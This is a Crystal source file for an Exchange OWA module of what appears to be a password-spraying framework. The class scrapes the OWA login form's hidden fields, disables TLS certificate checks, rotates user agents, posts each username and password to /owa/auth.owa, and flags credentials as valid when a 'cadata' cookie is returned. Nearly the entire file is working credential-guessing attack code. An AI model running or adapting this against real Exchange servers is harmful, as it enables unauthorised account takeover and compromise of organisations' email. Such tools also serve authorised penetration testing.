require "http/client"
require "crystagiri"
require "lexbor"

class ExchangeOWA < Sprayer
    property domain : String

    ## only uncomment if needed
    def initialize(usernames : Array(String), password : Array(String) )
        # init any special or default variables here
        super
        @domain = "WORKGROUP"
    end

    ## get /owa
            # - ge the flags?? i think?
            # yes there are 3 flags
                # - destination
                # - flags
                # - forcedownlevel

    ## post /owa/auth.owa HTTP
    ## host 
    ## valid if "cadata" cookie exisits



    # returns an array of [username, password, valid, lockout, mfa]
    def spray(username : String, password : String)  : SprayStatus
        # lockedout = false
        # valid = false
        # mfa = false
        spstatus = SprayStatus.new()
        spstatus.username = username 
        spstatus.password = password 

        # 
        # YOUR CODE BELOW 
        #

        # some basic setups for web based auth 
        url = URI.parse @target 
        # gotta set no verify for tls pages
        context = OpenSSL::SSL::Context::Client.new
        context.verify_mode = OpenSSL::SSL::VerifyMode::NONE
        # create a http client 
        client = HTTP::Client.new(url, tls: context)
        # and some basic header options
        header = HTTP::Headers{ # headers for post request 
            "User-Agent" => @useragents[rand(0..(@useragents.size - 1))],
            "Accept" => "*/*",
            "Accept-Language" => "en-US,en;q=0.5",
            "Accept-Encoding" => "gzip, deflate",
            "Content-Type" => "application/x-www-form-urlencoded",
            "Origin" => "https://#{url.host}",
            "Referer" => "https://#{url.host}#{url.path}"
        }

       
        headerget = HTTP::Headers{
            "User-Agent" => "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
            "Accept" => "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language" => "en-US,en;q=0.5",
            "Accept-Encoding" => "gzip, deflate"
        }

        # get the form data 
        # its typically through a redirect at /owa to get the full login page
        redirpage = client.get("/owa") #, headers: headerget)

        # for some reason the ip address may not work...try this ??? its weird on internals 
        # client = HTTP::Client.new( redirpage.headers["X-FEServer"] , tls: context)

        # handle redir 
        full_url = URI.parse( redirpage.headers["Location"] )
        page = client.get( "#{full_url.path}?#{full_url.query}" )#, headers: headerget)
               
         # cg = Crystagiri::HTML.new(page.body)
        # n = cg.at_css("input")
        # if n 
        #     # p n.node.attributes
        #     # = URI.encode_www_form(n.node.attributes["value"].content)
        #     n.node.attributes.each do |input|
        #         p input 
        #     end

        # else 
        #     raise "bad http parse error"
        # end
        # newurl = redirpage.

        dest : String = "" # yerp need this too 
        flags = 4 # you neeeeedddd this 
        forcedownlevel = 0 # not needed 
        passwordtext = "" # not needed 
        showpasswordcheck = "on" # not needed
        isutf8 = 1 # not needed

        # parse the headers... not 100% sure if i need this
        lb = Lexbor::Parser.new( page.body )
        lb.nodes(:input).each do |nod|
            if nod.attribute_by("name") == "destination"
                dest = nod.attribute_by("value").as(String)
            end
            if nod.attribute_by("name") == "flags"
                flags = nod.attribute_by("value").as(String)
            end
            if nod.attribute_by("name") == "forcedownlevel"
                forcedownlevel = nod.attribute_by("value").as(String)
            end
        end

        form = "destination=#{URI.encode_www_form(dest)}&flags=#{flags}&forcedownlevel=#{forcedownlevel}&username=#{@domain}%5C#{URI.encode_www_form(username)}&password=#{URI.encode_www_form(password)}&passwordText=&showPasswordCheck=on&isUtf8=1"
        

        # form = "username=#{username}&password=#{password}"
        
        # # here is the basic 
        page = client.post("/owa/auth.owa", form: form)

        begin 
            if page.cookies["cadata"]
                # valid = true 
                spstatus.valid_credentials = true 
            end
        rescue  # if not then the hash will error out....
        end



        #
        # end of your CODE make sure you set valid lockedout and mfa 
        # 
        
        # return [username, password, valid, lockedout, mfa]
        return spstatus
    end
end